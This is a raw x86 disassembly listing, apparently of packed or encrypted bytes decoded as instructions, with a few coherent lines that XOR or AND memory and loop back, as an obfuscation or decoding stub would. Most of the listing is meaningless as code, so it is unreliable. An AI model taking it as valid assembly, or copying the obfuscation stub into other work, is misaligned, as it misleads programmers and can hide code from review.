  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0x61907a48
  4072fa:	rcr    ebx,1
  4072fc:	cmp    eax,0x7e7ecf3f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x4072e6
  407306:	(bad)  
  407307:	clc    
  407308:	pop    ebx
  407309:	xchg   ebp,eax
  40730a:	jmp    0x9280:0x9e73921a
  407311:	mov    DWORD PTR [ecx],eax
  407313:	aaa    
  407314:	scas   eax,DWORD PTR es:[edi]
  407315:	mov    edx,0x5f2af6a3
  40731a:	mov    ecx,0x458d91e4
  40731f:	jp     0x4072b2
  407321:	mov    bl,0xe1
  407323:	push   eax
  407324:	and    bl,ah
  407326:	nop
  407327:	repz mov ah,0x5c
  40732a:	out    dx,eax
  40732b:	or     ch,bl
  40732d:	repz mov ds:0x7ffd7dc0,al
  407333:	vmread DWORD PTR [eax-0x63],edi
  407337:	cs (bad) 
  407339:	jns    0x40733f
  40733b:	sub    BYTE PTR [edi+ecx*2+0x6d],0x51
  407340:	popf   
  407341:	call   0xdc12d902
  407346:	push   ss
  407347:	fnstsw WORD PTR [edx-0x5269f045]
  40734d:	and    ebx,ebp
  40734f:	dec    ebp
  407350:	xchg   edi,eax
  407351:	sub    esp,ebx
  407353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407354:	inc    edx
  407355:	mov    ebx,0x3575459
  40735a:	sub    eax,0x2d8f9a5d
  40735f:	sahf   
  407360:	aas    
  407361:	ret    
  407362:	dec    edi
  407363:	loope  0x407302
  407365:	push   edi
  407366:	loopne 0x4073d8
  407368:	inc    ebx
  407369:	ins    BYTE PTR es:[edi],dx
  40736a:	sbb    al,0x7c
  40736c:	push   0xffffffd9
  40736e:	add    al,0x5c
  407370:	xor    BYTE PTR [edi],dh
  407372:	daa    
  407373:	loope  0x4073af
  407375:	adc    ecx,DWORD PTR [edi-0x36]
  407378:	cwde   
  407379:	gs sbb eax,0x2e67d0c1
  40737f:	jg     0x4073a1
  407381:	not    BYTE PTR [edx-0x1c83646]
  407387:	push   eax
  407388:	add    eax,0xe66aa40a
  40738d:	ins    BYTE PTR es:[edi],dx
  40738e:	mov    al,0x17
  407390:	pop    eax
  407391:	into   
  407392:	std    
  407393:	lahf   
  407394:	mov    ecx,edx
  407396:	fisttp DWORD PTR [edi]
  407398:	mov    ds:0x931c90ec,eax
  40739d:	cmp    BYTE PTR [esi+esi*8],ch
  4073a0:	popf   
  4073a1:	int    0xc8
  4073a3:	mov    cl,0xc4
  4073a5:	in     al,dx
  4073a6:	cmp    eax,0x3f8b3993
  4073ab:	cdq    
  4073ac:	arpl   WORD PTR [edi+eax*2+0x3cbd23a4],di
  4073b3:	inc    BYTE PTR [ecx-0x7da442cf]
  4073b9:	sti    
  4073ba:	test   eax,0x964531f7
  4073bf:	or     DWORD PTR [esi+0x3e],ecx
  4073c2:	xor    dh,bl
  4073c4:	retf   0x8d2c
  4073c7:	mov    WORD PTR [ebp-0x18],fs
  4073ca:	outs   dx,DWORD PTR ds:[esi]
  4073cb:	push   ebx
  4073cc:	repnz loop 0x40742d
  4073cf:	fwait
  4073d0:	cli    
  4073d1:	std    
  4073d2:	pop    edx
  4073d3:	jbe    0x40738f
  4073d5:	sbb    bh,0x30
  4073d8:	ret    
  4073d9:	rol    BYTE PTR [edi+0x1f32d23b],1
  4073df:	add    eax,0xaa07229
  4073e4:	mov    ebx,0x4f97a4d9
  4073e9:	ins    BYTE PTR es:[edi],dx
  4073ea:	jmp    0x3db6f950
  4073ef:	mov    edi,0xeebdc65e
  4073f4:	sub    eax,0x625c2138
  4073f9:	adc    bl,BYTE PTR [ebp-0x190285eb]
  4073ff:	lods   eax,DWORD PTR ds:[esi]
  407400:	fstp   DWORD PTR [ecx+ecx*1+0x3f]
  407404:	sub    dl,BYTE PTR [eax+edi*1]
  407407:	inc    ebp
  407408:	xchg   BYTE PTR [ebp-0x2a],dl
  40740b:	mov    al,0xa4
  40740d:	call   0x9dc02bb2
  407412:	mov    WORD PTR [edi-0x6631be7f],?
  407418:	retf   
  407419:	cmp    al,0xf
  40741b:	sar    BYTE PTR [ebp+0x5f],0xc2
  40741f:	cmp    al,0x81
  407421:	jae    0x4073a4
  407423:	jns    0x40743a
  407425:	xchg   ebx,eax
  407426:	call   0x55f92510
  40742b:	imul   ebp,ebx,0x1d
  40742e:	fwait
  40742f:	repnz adc edi,DWORD PTR [esi]
  407432:	lahf   
  407433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407434:	mov    esi,0x13427c2e
  407439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40743a:	dec    ecx
  40743b:	inc    eax
  40743c:	adc    DWORD PTR [esi],edi
  40743e:	fstp   DWORD PTR [ecx-0x3596a49b]
  407444:	shl    BYTE PTR [ecx],0x10
  407447:	pop    edx
  407448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407449:	cli    
  40744a:	or     ebx,edx
  40744c:	cld    
  40744d:	repz ss xchg bx,ax
  407451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407452:	dec    ebx
  407453:	or     ebx,esp
  407455:	call   0xfa77436
  40745a:	imul   ah
  40745c:	and    DWORD PTR [edx+0x42],0xffffffe6
  407460:	push   edi
  407461:	cli    
  407462:	pop    ecx
  407463:	les    ebp,FWORD PTR [ebx+0x27b56391]
  407469:	aad    0xf9
  40746b:	rcr    BYTE PTR [ecx-0x1a],1
  40746e:	into   
  40746f:	push   edx
  407470:	and    eax,0x60b2f777
  407475:	aas    
  407476:	sub    dl,bh
  407478:	int    0x9c
  40747a:	sub    eax,0x949b4eea
  40747f:	mov    ds:0xcc3f219f,al
  407484:	lds    edi,FWORD PTR [ebx-0x400361e9]
  40748a:	icebp  
  40748b:	dec    esi
  40748c:	std    
  40748d:	push   ds
  40748e:	xor    ah,dl
  407490:	push   es
  407491:	xor    ah,BYTE PTR [edi]
  407493:	mov    WORD PTR [edi+eax*2+0x5c],?
  407497:	les    esi,FWORD PTR [ebx+edx*2+0x39c9e398]
  40749e:	mov    al,ds:0x39c0a0d0
  4074a3:	out    dx,al
  4074a4:	cmp    dl,BYTE PTR [ebp+0x3b]
  4074a7:	and    ch,dh
  4074a9:	cmp    dl,BYTE PTR [edi]
  4074ab:	xchg   dl,bl
  4074ad:	or     edi,DWORD PTR [edx]
  4074af:	jo     0x407523
  4074b1:	push   esp
  4074b2:	dec    ecx
  4074b3:	test   BYTE PTR [ebx+0x7e],dh
  4074b6:	jb     0x4074fc
  4074b8:	loope  0x4074c5
  4074ba:	sbb    BYTE PTR [eax-0x343cdaaa],0x9e
  4074c1:	test   DWORD PTR [ebp+0x4c],edx
  4074c4:	daa    
  4074c5:	mov    esp,?
  4074c7:	inc    esp
  4074c8:	std    
  4074c9:	xchg   edx,eax
  4074ca:	sbb    edi,0xb1f2773c
  4074d0:	es push ss
  4074d2:	jp     0x40749d
  4074d4:	scas   al,BYTE PTR es:[edi]
  4074d5:	sbb    al,BYTE PTR [ebx-0x65fba125]
  4074db:	add    eax,edi
  4074dd:	lock inc edi
  4074df:	pop    esi
  4074e0:	ret    0x85e7
  4074e3:	(bad)  
  4074e5:	aas    
  4074e6:	jno    0x407473
  4074e8:	dec    ecx
  4074e9:	pop    eax
  4074ea:	sub    eax,0xd3ee65bc
  4074ef:	les    ebp,FWORD PTR [ebx+0x37a94259]
  4074f5:	ss jne 0x4074e7
  4074f8:	mov    edi,0x367be7cf
  4074fd:	push   ebp
  4074fe:	or     al,0x65
  407500:	ins    BYTE PTR es:[edi],dx
  407501:	clc    
  407502:	hlt    
  407503:	mov    al,0x96
  407505:	iret   
  407506:	mov    esp,0x570d8bd6
  40750b:	outs   dx,BYTE PTR ds:[esi]
  40750c:	repnz sbb eax,0x37bdefc8
  407512:	lahf   
  407513:	stc    
  407514:	fnstenv [ebx]
  407516:	mov    ebp,0xc0594cbf
  40751b:	aam    0xb7
  40751d:	push   ds
  40751e:	add    edi,edi
  407520:	dec    ebx
  407521:	shr    BYTE PTR [edx],cl
  407523:	inc    esp
  407524:	test   BYTE PTR [eax+0x61],0xe1
  407528:	mov    BYTE PTR [eax],dl
  40752a:	aas    
  40752b:	enter  0x7d72,0x95
  40752f:	rcl    ch,cl
  407531:	mov    al,ds:0xc7547af5
  407536:	into   
  407537:	jl     0x407515
  407539:	dec    esi
  40753a:	pushf  
  40753b:	lahf   
  40753c:	mov    bl,0xfc
  40753e:	xor    edi,esi
  407540:	inc    edx
  407541:	int    0x43
  407543:	fwait
  407544:	mov    BYTE PTR [eax],ch
  407546:	cmp    al,0x46
  407548:	outs   dx,BYTE PTR ds:[esi]
  407549:	jmp    0x32689d0d
  40754e:	retf   0x9479
  407551:	cmp    al,0x7a
  407553:	xchg   esi,eax
  407554:	fild   QWORD PTR [bx+di]
  407557:	push   ss
  407558:	jg     0x4075ac
  40755a:	enter  0x4d20,0xb9
  40755e:	and    al,0xe8
  407560:	add    esp,DWORD PTR [ebx]
  407562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407563:	sbb    ah,BYTE PTR [edx]
  407565:	arpl   WORD PTR [edx-0x3e],di
  407568:	and    al,0xb4
  40756a:	in     eax,dx
  40756b:	mov    BYTE PTR ds:0xb07fc60e,bh
  407571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407572:	jg     0x4075a1
  407574:	push   0x4e
  407576:	jne    0x40750d
  407578:	mov    edx,edx
  40757a:	pop    ebx
  40757b:	xor    ah,BYTE PTR [eax-0x79]
  40757e:	push   cs
  40757f:	in     al,dx
  407580:	retf   0x41d6
  407583:	xor    eax,0xba10205f
  407588:	or     DWORD PTR [ebx],ebp
  40758a:	sub    ebp,esi
  40758c:	inc    esp
  40758d:	cmp    ebp,edx
  40758f:	fs cmc 
  407591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407592:	out    dx,eax
  407593:	push   es
  407594:	pop    edx
  407595:	xchg   ecx,eax
  407596:	pop    edx
  407597:	mov    eax,ds:0x5ff99227
  40759c:	stos   BYTE PTR es:[edi],al
  40759d:	enter  0x18c,0x4b
  4075a1:	mov    ebx,0xfdbdd8aa
  4075a6:	dec    ebp
  4075a7:	mov    ds:0x50b956bc,eax
  4075ad:	fwait
  4075ae:	pushf  
  4075af:	mov    ds,WORD PTR [edi]
  4075b1:	push   ebp
  4075b2:	xchg   edx,eax
  4075b3:	mov    ebx,0xd8945dbd
  4075b8:	shl    BYTE PTR [esi-0x5ec12bc6],cl
  4075be:	nop
  4075bf:	jbe    0x40760f
  4075c1:	adc    al,0xf7
  4075c3:	in     al,dx
  4075c4:	inc    edx
  4075c5:	xor    edx,eax
  4075c7:	fwait
  4075c8:	or     eax,0x1161cb08
  4075cd:	push   edi
  4075ce:	loope  0x4075ee
  4075d0:	xchg   BYTE PTR ds:0x4837d361,dh
  4075d6:	out    0xc0,al
  4075d8:	fdiv   st(1),st
  4075da:	fisubr WORD PTR [eax-0x33]
  4075dd:	xchg   ebx,eax
  4075de:	xchg   edi,eax
  4075df:	(bad)  
  4075e0:	push   ecx
  4075e1:	inc    esp
  4075e2:	fadd   DWORD PTR es:[edi+0x4]
  4075e6:	sbb    eax,0xbbd24215
  4075eb:	jno    0x407574
  4075ed:	mov    al,ds:0xa5b0517c
  4075f2:	add    DWORD PTR [eax+0x51],ebp
  4075f5:	adc    esp,DWORD PTR [edx+0x59]
  4075f8:	and    al,0x16
  4075fa:	sbb    BYTE PTR [edx-0x73c9b66f],bl
  407600:	mov    edx,0xa3b0ccb0
  407605:	sbb    BYTE PTR [eax+edi*2],cl
  407608:	shl    DWORD PTR [ebx+0x5221017e],0xb3
  40760f:	ret    
  407610:	mov    ds:0x6cc75e9,al
  407615:	enter  0xafbf,0x70
  407619:	cmp    BYTE PTR [esi+0x58],bl
  40761c:	inc    ebx
  40761d:	int3   
  40761e:	cmp    BYTE PTR [ebx-0x73],cl
  407621:	mov    BYTE PTR [esi-0x7b77552b],bl
  407627:	sbb    ch,ah
  407629:	push   es
  40762a:	in     al,0xac
  40762c:	ins    DWORD PTR es:[edi],dx
  40762d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40762e:	xchg   edi,eax
  40762f:	add    al,0xac
  407631:	pop    es
  407632:	(bad)  
  407634:	xchg   edx,eax
  407635:	pop    edx
  407636:	leave  
  407637:	push   ebp
  407638:	mov    ah,al
  40763a:	or     eax,0x5f429902
  40763f:	xchg   ebp,eax
  407640:	aad    0x24
  407642:	in     eax,dx
  407643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407644:	xor    ecx,esi
  407646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407647:	(bad)  
  407648:	leave  
  407649:	add    al,0xf4
  40764b:	push   cs
  40764c:	add    BYTE PTR [eax],al
  40764e:	mov    al,0x61
  407650:	sub    eax,0x4f5f74d
  407655:	dec    edx
  407656:	stos   BYTE PTR es:[edi],al
  407657:	daa    
  407658:	and    DWORD PTR [ebx],esp
  40765a:	add    al,0x73
  40765c:	inc    eax
  40765d:	cli    
  40765e:	out    0xd,al
  407660:	in     eax,0xdd
  407662:	scas   eax,DWORD PTR es:[edi]
  407663:	(bad)  
  407664:	dec    ebx
  407665:	cld    
  407666:	fisub  DWORD PTR [esi-0x6e2f355e]
  40766c:	mov    esp,0x8bf2c2c5
  407671:	test   BYTE PTR [edx-0x3f],dl
  407674:	nop
  407675:	int    0xf7
  407677:	mov    ds:0x847e574,al
  40767c:	(bad)  
  40767e:	es xchg esp,eax
  407680:	aaa    
  407681:	push   es
  407682:	out    dx,al
  407683:	xchg   ebp,eax
  407684:	pop    ecx
  407685:	mov    eax,ds:0x60e861fb
  40768a:	push   ss
  40768b:	pop    esp
  40768c:	into   
  40768d:	cmp    al,0x14
  40768f:	mov    ds:0xba8b5fed,eax
  407694:	ja     0x4076a6
  407696:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407698:	add    eax,0xeca3eacb
  40769d:	mov    ds:0x256dda95,al
  4076a2:	iret   
  4076a3:	js     0x407651
  4076a5:	dec    esp
  4076a6:	mov    eax,0x93b0b49e
  4076ab:	int3   
  4076ac:	bound  eax,QWORD PTR [eax+eiz*1-0xc02a69]
  4076b3:	sub    eax,0x35cbd6f6
  4076b8:	pop    esi
  4076b9:	adc    BYTE PTR [ecx+ecx*2-0x18ed9432],0x8d
  4076c1:	jp     0x4076a8
  4076c3:	pop    ss
  4076c4:	clc    
  4076c5:	sub    BYTE PTR [esi-0x2cc70ce],dh
  4076cb:	hlt    
  4076cc:	sbb    BYTE PTR [ebx],dl
  4076ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076cf:	lock mov edi,0x971cddf3
  4076d5:	add    al,0x5b
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0xb5fc38ec
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x4076d8
  40772b:	lods   eax,DWORD PTR ds:[esi]
  40772c:	bound  edx,QWORD PTR [ecx+ebp*1]
  40772f:	popa   
  407730:	into   
  407731:	xchg   esp,eax
  407732:	or     DWORD PTR [edi],ebx
  407734:	ficomp WORD PTR [eax]
  407736:	and    bl,BYTE PTR [ebx+0x67]
  407739:	pop    esp
  40773a:	mov    bh,0x54
  40773c:	ror    ecx,1
  40773e:	xchg   DWORD PTR [ebp-0x76d81d25],eax
  407744:	aam    0x37
  407746:	icebp  
  407747:	cdq    
  407748:	ret    
  407749:	xchg   DWORD PTR [ebp+eiz*1+0x61c24915],edi
  407750:	popa   
  407751:	je     0x4077ce
  407753:	ret    
  407754:	adc    eax,0xadebd793
  407759:	(bad)  es:[eax-0x7c]
  40775d:	or     dh,BYTE PTR [eax-0x79]
  407760:	sub    edx,esi
  407762:	iret   
  407763:	pop    ds
  407764:	repz push ecx
  407766:	push   edx
  407767:	addr16 inc edx
  407769:	lahf   
  40776a:	adc    DWORD PTR [edx+0x2dda734b],0x725a069e
  407774:	add    BYTE PTR fs:[ebx-0x7b],cl
  407778:	test   eax,0xca11092d
  40777d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40777e:	pop    eax
  40777f:	cmp    DWORD PTR [eax-0x6cdf4f11],esi
  407785:	shld   esp,edx,0x6e
  407789:	repnz pop ebp
  40778b:	push   eax
  40778c:	cwde   
  40778d:	ret    0x84b
  407790:	sbb    al,0x98
  407792:	sbb    BYTE PTR [ebp+0x4d7eb453],0xb1
  407799:	clc    
  40779a:	push   edi
  40779b:	cmp    dl,ah
  40779d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40779e:	scas   eax,DWORD PTR es:[edi]
  40779f:	outs   dx,DWORD PTR ds:[esi]
  4077a0:	xor    al,0x43
  4077a2:	or     al,0x2c
  4077a4:	es pop esi
  4077a6:	push   0xffffffcc
  4077a8:	es push esi
  4077aa:	sbb    al,0xa8
  4077ac:	pop    esi
  4077ad:	jl     0x407773
  4077af:	test   al,0x54
  4077b2:	enter  0x2d19,0x73
  4077b6:	push   cs
  4077b7:	call   0x3d21:0x50bb4b71
  4077be:	lods   al,BYTE PTR ds:[esi]
  4077bf:	inc    ecx
  4077c0:	stos   DWORD PTR es:[edi],eax
  4077c1:	in     eax,dx
  4077c2:	sub    al,0x6e
  4077c4:	sbb    eax,0xff7a6ec8
  4077c9:	sbb    eax,0xe111c8b2
  4077ce:	outs   dx,BYTE PTR ds:[esi]
  4077cf:	inc    ebp
  4077d0:	push   cs
  4077d1:	rcl    BYTE PTR [ebp*4-0x169e10c8],cl
  4077d8:	add    cl,al
  4077da:	sub    eax,0x9a517e22
  4077df:	xor    DWORD PTR [ecx+0x70dfbc7b],0xffffffe4
  4077e6:	pusha  
  4077e7:	or     edx,ecx
  4077e9:	iret   
  4077ea:	cmc    
  4077eb:	(bad)  [ecx]
  4077ed:	mov    edi,0x52a75236
  4077f2:	loope  0x4077d8
  4077f4:	xchg   ebx,eax
  4077f5:	pop    esi
  4077f6:	sbb    eax,0x266aebd8
  4077fb:	cmp    ch,ch
  4077fd:	(bad)  
  4077fe:	shr    BYTE PTR [edx+0x43e05e6d],0xbe
  407805:	xor    esp,edi
  407807:	jl     0x4077ef
  407809:	ficom  WORD PTR [ecx+0x38]
  40780c:	ret    0x4712
  40780f:	xor    BYTE PTR [bx+di-0x20],0x10
  407814:	add    DWORD PTR [ebx-0x3917acf0],ebx
  40781a:	jmp    0x471f:0x99afd169
  407821:	pop    ds
  407822:	and    al,0xd8
  407824:	(bad)
  407828:	outs   dx,BYTE PTR ds:[esi]
  407829:	pop    ss
  40782a:	loopne 0x4077d6
  40782c:	mov    esi,0xae1d8d41
  407831:	sti    
  407832:	xor    BYTE PTR [edi],cl
  407834:	mov    edi,0x461b561
  407839:	cmc    
  40783a:	jmp    0x4077ea
  40783c:	cwd    
  40783e:	mov    bl,0x11
  407840:	fdivp  st(6),st
  407842:	push   0x8904bbab
  407847:	push   ebx
  407848:	rol    DWORD PTR [ebx-0x53],0xf4
  40784c:	pop    eax
  40784d:	imul   ecx,ecx,0x79f82b60
  407853:	stos   BYTE PTR es:[edi],al
  407854:	daa    
  407855:	loopne 0x4078a0
  407857:	das    
  407858:	aam    0xf
  40785a:	out    dx,eax
  40785b:	add    eax,0x3ef41cc8
  407860:	loop   0x407806
  407862:	push   ebx
  407863:	mov    bl,0xa3
  407865:	mov    ah,0x63
  407867:	mov    edi,0xd1966df9
  40786c:	mov    esp,0xa58ba9df
  407871:	in     eax,dx
  407872:	scas   al,BYTE PTR es:[edi]
  407873:	enter  0x9291,0xc4
  407877:	cdq    
  407878:	jae    0x4078f6
  40787a:	inc    ebp
  40787b:	test   al,0xab
  40787d:	shl    esi,cl
  40787f:	sub    DWORD PTR [edx+0x7f],eax
  407882:	mov    cl,0x8f
  407884:	xchg   ebp,eax
  407885:	xor    DWORD PTR [ebx],ecx
  407887:	jne    0x407830
  407889:	cmp    ebp,DWORD PTR [esi-0x75]
  40788c:	imul   esi,DWORD PTR [edx],0xffffffbb
  40788f:	add    DWORD PTR [eax-0x25de7690],eax
  407895:	adc    DWORD PTR [esi+eiz*8-0x4f],0xffffffca
  40789a:	icebp  
  40789b:	push   ss
  40789c:	jno    0x407844
  40789e:	xor    BYTE PTR [ecx+eiz*4+0x4b],ch
  4078a2:	jne    0x40789f
  4078a4:	inc    cl
  4078a6:	repnz add BYTE PTR [edi-0x6d],0xcd
  4078ab:	cwde   
  4078ac:	sahf   
  4078ad:	and    dl,BYTE PTR [eax]
  4078af:	pop    edi
  4078b0:	jle    0x40786b
  4078b2:	test   BYTE PTR [edi+0x1137982a],dh
  4078b8:	jmp    DWORD PTR [ebx]
  4078ba:	jecxz  0x40790c
  4078bc:	or     al,0x83
  4078be:	frstor [eax]
  4078c0:	or     esi,DWORD PTR cs:[edx-0x41]
  4078c4:	or     ah,BYTE PTR [ecx-0x2fa9273b]
  4078ca:	mov    esi,0x4fa11047
  4078cf:	rcl    DWORD PTR [ecx],cl
  4078d1:	call   0xabe2a606
  4078d6:	loop   0x407875
  4078d8:	cmp    eax,0xea7895a5
  4078dd:	faddp  st(6),st
  4078df:	jmp    0x8ccc51bb
  4078e4:	or     al,0x3b
  4078e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078e7:	xor    eax,DWORD PTR ds:0xb226bd27
  4078ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078ee:	icebp  
  4078ef:	imul   edx,DWORD PTR [edx-0x45f850d8],0x2f
  4078f6:	adc    BYTE PTR [esi],dh
  4078f8:	stos   BYTE PTR es:[edi],al
  4078f9:	mov    ds:0xf6560875,eax
  4078fe:	dec    ebp
  4078ff:	mov    cl,0x2b
  407901:	jno    0x40794e
  407903:	es retf 
  407905:	call   0x5e3:0x42c5e1aa
  40790c:	cwde   
  40790d:	pusha  
  40790e:	sbb    al,0x42
  407910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407911:	xor    eax,0xb3b13044
  407916:	mov    esp,0x5350c81f
  40791b:	aas    
  40791c:	out    0x2f,al
  40791e:	inc    ecx
  40791f:	es in  al,dx
  407921:	test   al,0x9c
  407923:	and    bh,ch
  407925:	jbe    0x40799d
  407927:	adc    al,0xf1
  407929:	and    eax,0x8b77b493
  40792e:	mov    ebp,0x1aefaf61
  407933:	inc    esp
  407934:	xor    al,0xf3
  407936:	ss push esi
  407938:	(bad)
  40793b:	push   es
  40793c:	cwde   
  40793d:	imul   ebx,DWORD PTR [edi],0xd93c37ba
  407943:	iret   
  407944:	and    ah,ch
  407946:	and    eax,0x5c5dd7f9
  40794b:	enter  0xe96,0xd1
  40794f:	mov    eax,ds:0x1685ec7d
  407954:	mov    ebx,0x1119d4e9
  407959:	xchg   ecx,eax
  40795b:	mov    cl,0x90
  40795d:	adc    BYTE PTR [eax+ecx*8],0x57
  407961:	gs cmp dh,dh
  407964:	cld    
  407965:	fist   WORD PTR [edx-0x69]
  407968:	mov    edx,0x8b718e2
  40796d:	cmc    
  40796e:	sbb    esi,esi
  407970:	fsub   st(6),st
  407972:	daa    
  407973:	mov    al,ds:0xa23c60cf
  407978:	mov    DWORD PTR [edx-0x67fd70a1],esi
  40797e:	xchg   ecx,eax
  40797f:	dec    edx
  407980:	pop    edx
  407981:	test   DWORD PTR [ebx+0x67144498],ecx
  407987:	nop
  407988:	mov    eax,ds:0x7b3c352d
  40798d:	sub    eax,0xc1a04168
  407992:	fs cmc 
  407994:	call   0xc631:0x86eafcb
  40799b:	and    al,0xd4
  40799d:	push   es
  40799e:	repnz push cs
  4079a0:	xor    BYTE PTR [ebp-0x4038b484],ah
  4079a6:	or     BYTE PTR [edx+0x71],cl
  4079a9:	cld    
  4079aa:	jp     0x40793b
  4079ac:	popa   
  4079ad:	xchg   ebp,eax
  4079ae:	adc    eax,ecx
  4079b0:	std    
  4079b1:	fs push ebp
  4079b3:	or     al,0x13
  4079b5:	in     eax,0x62
  4079b7:	mov    gs,WORD PTR [edx+0x5b6caadc]
  4079bd:	loope  0x407a0b
  4079bf:	ja     0x40799a
  4079c1:	mov    ebx,0xab13579c
  4079c6:	sub    eax,0xb9c3f967
  4079cb:	sbb    BYTE PTR [esi-0x58],0xe1
  4079cf:	cli    
  4079d0:	retf   0x51cb
  4079d3:	or     DWORD PTR [ecx+0x1e8916],esp
  4079d9:	mov    cs,ebx
  4079db:	xor    al,bh
  4079dd:	sub    eax,0xd6ba3206
  4079e2:	and    ebx,ebp
  4079e4:	mov    ecx,0x968ff821
  4079e9:	gs pushf 
  4079eb:	lock mov al,0xa6
  4079ee:	xchg   ebx,eax
  4079ef:	or     BYTE PTR [ecx-0x5a769949],0x56
  4079f6:	jmp    0x4079c5
  4079f8:	mov    al,dl
  4079fa:	sub    esi,DWORD PTR [edi+ebx*2-0x2b]
  4079fe:	mov    ah,0x42
  407a00:	mov    bh,0xd6
  407a02:	out    dx,eax
  407a03:	test   DWORD PTR [edi+edi*1+0x2b],edx
  407a07:	mov    ds:0x70f5a746,eax
  407a0c:	js     0x407a31
  407a0e:	stos   BYTE PTR es:[edi],al
  407a0f:	add    BYTE PTR [ecx+0x60],bh
  407a12:	add    eax,DWORD PTR [edi+0x32]
  407a15:	scas   eax,DWORD PTR es:[edi]
  407a16:	das    
  407a17:	mov    al,0x67
  407a19:	cmp    bl,bh
  407a1b:	or     ch,BYTE PTR [ebx+0x72412a93]
  407a21:	jb     0x4079b8
  407a23:	test   eax,0x916052ca
  407a28:	sub    eax,0x67531266
  407a2d:	pop    ebx
  407a2e:	not    BYTE PTR [ecx+ecx*2]
  407a31:	xchg   esp,eax
  407a32:	call   0xf239:0xa4015a2c
  407a39:	cs int 0xc1
  407a3c:	xor    dl,ah
  407a3e:	inc    dh
  407a40:	add    al,0xf1
  407a42:	pop    es
  407a43:	adc    eax,0x8237109e
  407a48:	fld    DWORD PTR [edi-0xe4436f1]
  407a4e:	cdq    
  407a4f:	es push eax
  407a51:	push   ebp
  407a52:	mov    bh,0x7b
  407a54:	sub    al,0xcc
  407a56:	dec    ebx
  407a57:	mov    edi,0xef6d38df
  407a5c:	shl    BYTE PTR [ebx-0x36],cl
  407a5f:	add    DWORD PTR [esi+0x27554a5d],edi
  407a65:	sub    eax,0x167f34ad
  407a6a:	js     0x407a50
  407a6c:	fdivr  DWORD PTR [ecx+0x74233bcb]
  407a72:	mov    al,0xcb
  407a74:	adc    eax,0xc0464984
  407a79:	add    DWORD PTR [edi-0x72],esi
  407a7c:	pop    edi
  407a7d:	mov    edx,0x60b5004f
  407a82:	push   ebp
  407a83:	and    BYTE PTR [ebx-0x9],cl
  407a86:	mov    WORD PTR [ebp+0x2a],es
  407a89:	mov    gs,WORD PTR [eax-0x30]
  407a8c:	mov    ebx,0x9d14ffe8
  407a91:	mov    ds:0xb3a037e8,al
  407a96:	mov    bh,0xfb
  407a98:	out    0x5d,eax
  407a9a:	jnp    0x407a75
  407a9c:	outs   dx,DWORD PTR ds:[esi]
  407a9d:	dec    edx
  407a9e:	push   esp
  407a9f:	pop    ds
  407aa0:	call   DWORD PTR [edi-0x33340871]
  407aa6:	push   ds
  407aa7:	sbb    ah,BYTE PTR [eax-0x35]
  407aaa:	(bad)  
  407aab:	cli    
  407aac:	ret    
  407aad:	cmp    eax,0x959a0f0f
  407ab2:	lods   eax,DWORD PTR ds:[esi]
  407ab3:	fldenv [ebx-0x51ef5835]
  407ab9:	pushf  
  407aba:	int    0xdc
  407abc:	imul   ebp,DWORD PTR [ebp-0x78],0x3632def6
  407ac3:	sub    BYTE PTR [ebp+edi*4-0x51],dh
  407ac7:	jg     0x407ac4
  407ac9:	cmp    eax,0xd58ac4b6
  407ace:	(bad)  
  407acf:	lea    edi,[edx]
  407ad1:	inc    ebx
  407ad2:	pop    ebp
  407ad3:	std    
  407ad4:	iret   
  407ad5:	pop    eax
  407ad6:	fldcw  WORD PTR [edi]
  407ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ad9:	daa    
  407ada:	out    dx,al
  407adb:	ins    BYTE PTR es:[edi],dx
  407adc:	popf   
  407add:	out    dx,al
  407ade:	pop    ecx
  407adf:	mov    esp,0x554c66b6
  407ae5:	imul   ecx,DWORD PTR [esi],0xffffff84
  407ae8:	cli    
  407ae9:	dec    ebp
  407aea:	test   al,0xc5
  407aec:	adc    al,ah
  407aee:	repnz pop edx
  407af0:	fsubr  QWORD PTR [eax+0x7f]
  407af3:	inc    ebx
  407af4:	pop    ecx
  407af5:	sbb    BYTE PTR [eax-0x6],0xd
  407af9:	dec    ecx
  407afa:	cmc    
  407afb:	mov    eax,DWORD PTR [ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
